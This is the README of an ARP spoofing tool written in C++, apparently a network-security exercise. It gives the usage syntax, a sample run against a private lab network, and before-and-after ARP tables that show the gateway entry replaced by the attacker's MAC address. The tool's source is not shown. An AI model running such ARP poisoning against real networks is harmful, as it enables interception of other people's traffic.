# APR_Spoofing

## info ##
* ARP Spoofing
* C++
* Compile with [C++11]
* It must run as root
* Environment : Ubuntu 16.04.02 LTS


## Usage ##
```sh
Usage: send_arp <interface> <sender(victim) ip> <target ip>
Ex)send_arp eth0 192.168.10.2 192.168.10.123
```

Example)
```sh
zanywhale@ubuntu:~/git/send_arp$ sudo ./send_arp ens33 192.168.181.2 192.168.181.166
[sudo] password for zanywhale:
[+] ARP_Request(BroadCast)... then get target's MAC address!
[+] ARP_Request is done.
[+] Capture ARP_REPLY...
[+] Find target_IP's MAC addr : 000C29EF6086
================== Status =================
Interface       : ens33
my_MAC Address  : 000C2901AEF4
my_IP Address   : 192.168.181.170
sender_ip       : 192.168.181.2
target_ip       : 192.168.181.166
target_mac      : 000C29EF6086
===========================================
[+] ARP_REPLY... Change ARP Table!
[+] ARP_REPLY is done.
[+] Done! Check it now!
[+] ARP_REPLY... Change ARP Table!
[+] ARP_REPLY is done.
[+] Done! Check it now!
......
```

## Result ##
```sh
zanywhale@ubuntu:~$ arp
Address                  HWtype  HWaddress           Flags Mask            Iface
192.168.181.2            ether   00:50:56:e3:4c:8f   C                     ens33
192.168.181.1            ether   00:50:56:c0:00:08   C                     ens33
zanywhale@ubuntu:~$ 
zanywhale@ubuntu:~$ arp
Address                  HWtype  HWaddress           Flags Mask            Iface
192.168.181.2            ether   00:0c:29:01:ae:f4   C                     ens33
192.168.181.1            ether   00:50:56:c0:00:08   C                     ens33

```

